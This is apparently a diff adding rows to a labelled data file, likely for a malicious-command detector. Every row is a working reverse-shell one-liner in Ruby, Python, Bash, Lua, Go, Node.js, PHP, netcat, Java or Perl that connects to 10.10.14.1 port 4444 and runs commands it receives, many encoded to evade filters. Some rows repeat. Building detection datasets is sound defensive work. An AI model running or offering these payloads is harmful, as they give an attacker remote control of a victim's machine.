+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
+"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
+"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
+"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
+"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
+"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
+"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
+"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
+"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
+"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
+"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
+"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
+"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
+"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
+"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
